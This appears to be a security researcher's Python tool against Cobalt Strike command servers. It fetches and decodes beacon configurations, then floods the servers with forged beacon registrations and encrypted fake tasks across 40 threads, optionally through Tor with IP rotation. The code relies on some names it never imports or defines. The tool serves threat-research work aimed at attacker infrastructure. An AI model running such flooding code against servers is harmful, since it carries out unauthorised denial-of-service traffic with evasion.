#!/usr/bin/python3
'''
By Gal Kristal from SentinelOne (gkristal.w@gmail.com) @gal_kristal
Refs: 
    https://github.com/RomanEmelyanov/CobaltStrikeForensic/blob/master/L8_get_beacon.py
    https://github.com/nccgroup/pybeacon
'''

import requests, struct, sys, os, urllib3
import argparse
from parse_beacon_config import cobaltstrikeConfig
from urllib.parse import urljoin
from io import BytesIO
from Crypto.Cipher import AES
import hmac
import urllib
import socket
from comm import *
import re
import rstr
import threading
import itertools
import time
from datetime import datetime
from threading import Timer

HASH_ALGO = hashlib.sha256
SIG_SIZE = HASH_ALGO().digest_size
CS_FIXED_IV = b"abcdefghijklmnop"

EMPTY_UA_HEADERS = {"User-Agent":""}
URL_PATHS = {'x86':'ab2g', 'x64':'ab2h'}
max_threads = 40 # Number of threads for spamming
tor_session = None
tor_ip_renew_interval = max_threads * 3  # Renew IP after every X beacons sent


class FastWriteCounter(object):
    def __init__(self):
        self._number_of_read = 0
        self._counter = itertools.count()
        self._read_lock = threading.Lock()

    def increment(self):
        next(self._counter)

    def value(self):
        with self._read_lock:
            value = next(self._counter) - self._number_of_read
            self._number_of_read += 1
        return value


def exitfunc():
    # For benchmarking purposes
    print("Exit Time", datetime.now())
    os._exit(0)


def get_beacon_data(url, arch):
    full_url = urljoin(url, URL_PATHS[arch])
    try:
        if tor_session != None:
            resp = tor_session.get(full_url, timeout=30, headers=EMPTY_UA_HEADERS, verify=False)
        else:
            resp = requests.get(full_url, timeout=30, headers=EMPTY_UA_HEADERS, verify=False)
    except requests.exceptions.RequestException as e:
        print('[-] Connection error: ', e)
        return

    if resp.status_code != 200:
        print('[-] Failed with HTTP status code: ', resp.status_code)
        return

    buf = resp.content

    # Check if it's a Trial beacon, therefore not xor encoded (not tested)
    eicar_offset = buf.find(b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE')
    if eicar_offset != -1:
        return cobaltstrikeConfig(BytesIO(buf)).parse_config()

    offset = buf.find(b'\xff\xff\xff')
    if offset == -1:
        print('[-] Unexpected buffer received')
        return
    offset += 3
    key = struct.unpack_from('<I', buf, offset)[0]
    size = struct.unpack_from('<I', buf, offset+4)[0] ^ key
    head_enc = struct.unpack_from('<I', buf, offset+8)[0] ^ key
    head = head_enc & 0xffff

    # Taken directly from L8_get_beacon.py
    if head == 0x5a4d or head ==0x9090:
        decoded_data = b''
        for i in range(2+offset//4, len(buf)//4-4):
            a = struct.unpack_from('<I', buf, i*4)[0]
            b = struct.unpack_from('<I', buf, i*4+4)[0]
            с = a ^ b
            decoded_data += struct.pack('<I', с)

        return cobaltstrikeConfig(BytesIO(decoded_data)).parse_config()


def register_beacon(conf, cnt):
    """Registers a random beacon and sends a task data.
    This is a POC that shows how a beacon send its metadata and task results with Malleable profiles
    
    Args:
        conf (dict): Beacon configuration dict, from cobaltstrikeConfig parser
    """
    # Register new random beacon
    if conf['BeaconType'][0] == 'HTTP' or conf['BeaconType'][0] == 'HTTPS':
        pass
    else:
        print("BeaconType " + str(conf['BeaconType']) + " not yet supported! Quitting.")
        return

    aes_source = os.urandom(16)
    m = Metadata(conf['PublicKey'], aes_source, str(conf['Spawnto_x64']))
    t = Transform(conf['HttpGet_Metadata'])

    body, headers, params = t.encode(m.pack().decode('latin-1'), '', str(m.bid))

    if ( 'HostHeader' in conf):
        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
        if domain :
            headers['Host'] = domain.group(1).strip()
    print('[+] Registering new random beacon: comp=%s user=%s url=%s' % (m.comp, m.user, urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1])))
    try:
        if tor_session != None:
            req = tor_session.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
        else:
            req = requests.request('GET', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['C2Server'].split(',')[1]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
    except Exception as e:
        print('[-] Got exception from server: %s' % e)
        return

    # This is how to properly encrypt a task:
    # Tasks are encrypted with the session's aes key, decided and negotiated when we registered the beacon (it's part of the metadata)
    ## Here is where you'll build a proper task struct ##
    random_data = os.urandom(50)
    # session counter = 1
    data = struct.pack('>II', 1, len(random_data)) + random_data
    pad_size = AES.block_size - len(data) % AES.block_size
    data = data + pad_size * b'\x00'

    # encrypt the task data and wrap with hmac sig and encrypted data length
    cipher = AES.new(m.aes_key, AES.MODE_CBC, CS_FIXED_IV)
    enc_data = cipher.encrypt(data)
    sig = hmac.new(m.hmac_key, enc_data, HASH_ALGO).digest()[0:16]
    enc_data += sig
    enc_data = struct.pack('>I', len(enc_data)) + enc_data

    # task data is POSTed so we need to take the transformation steps of http-post.client
    t = Transform(conf['HttpPost_Metadata'])
    body, headers, params = t.encode(m.pack().decode('latin-1'), enc_data.decode('latin-1'), str(m.bid))

    if ( 'HostHeader' in conf):
        domain = re.search('Host: (.*)$', conf['HostHeader'], re.I)
        if domain :
            headers['Host'] = domain.group(1).strip()

    #print('[' + str(cnt.value()) + '] Sending task data')

    try:
        if tor_session != None:
            req = tor_session.request('POST', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['HttpPostUri'].split(',')[0]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
        else:
            req = requests.request('POST', urljoin(conf['BeaconType'][0]+'://'+conf['C2Server'].split(',')[0]+':'+str(conf['Port']), conf['HttpPostUri'].split(',')[0]), verify=False, params=params, data=body, headers=dict(**headers, **{'User-Agent':''}), timeout=5)
        print('[Response code: ' + str(req.status_code) + ']')
        cnt.increment()
        print('[' + str(cnt.value()) + '] Task sent')
    except Exception as e:
        print('[-] Got exception from server while sending task: %s' % e)

    if tor_session != None:
        if cnt.value() % tor_ip_renew_interval == 0:
            print("Renewing TOR IP")
            spam_utils.renew_tor_ip()
            print("New IP: " + spam_utils.get_current_ip())


def spam(confs, cnt):
    while (1==1):
        for c in confs:
            register_beacon(c, cnt)
            

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-u", "--url", help="Target a single URL")
    group.add_argument("-f", "--file", help="Read targets from text file - One CS server per line")
    parser.add_argument("--use_tor", help="Should tor be used to connect to target?", default=False, type=lambda x: (str(x).lower() == 'true'))
    args = parser.parse_args()

    if args.use_tor:
        if spam_utils.test_tor():
            tor_session = spam_utils.get_tor_session()
        else:
            print("Tor is not working")
            exit(1)

    if args.url:
        confs = []
        print("[*] Now testing " + args.url)
        x86_beacon_conf = get_beacon_data(args.url, 'x86')
        x64_beacon_conf = get_beacon_data(args.url, 'x64')
        if not x86_beacon_conf and not x64_beacon_conf:
            print("[-] Failed finding any beacon configuration")
            exit(1)

        print("[+] Got beacon configuration successfully")
        conf = x86_beacon_conf or x64_beacon_conf
        confs.append(conf)

        cnt = FastWriteCounter()
        threads = []
        for i in range(max_threads):
            print("Spawning new thread")
            t = threading.Thread(target=spam, args=(confs,cnt))
            threads.append(t)
            t.start()

    if args.file:
        confs = []
        try:
            f = open(args.file, 'r')
        except OSError:
            print("Could not open/read file:", fname)
            sys.exit()

        with f:
            reader = f.readlines()
            for line in reader:
                if line[0] != '#':
                    print("[*] Now testing " + line.replace("\n",''))
                    x86_beacon_conf = get_beacon_data(line, 'x86')
                    x64_beacon_conf = get_beacon_data(line, 'x64')
                    if not x86_beacon_conf and not x64_beacon_conf:
                        print("[-] Failed finding any beacon configuration")
                    else:
                        print("[+] Got beacon configuration successfully")
                        conf = x86_beacon_conf or x64_beacon_conf
                        confs.append(conf)

            if len(confs) > 0:
                cnt = FastWriteCounter()
                threads = []
                for i in range(max_threads):
                    print("Spawning new thread")
                    t = threading.Thread(target=spam, args=(confs,cnt))
                    threads.append(t)
                    t.start()
            else:
                print("Couldn't find any valid targets - aborting ...")
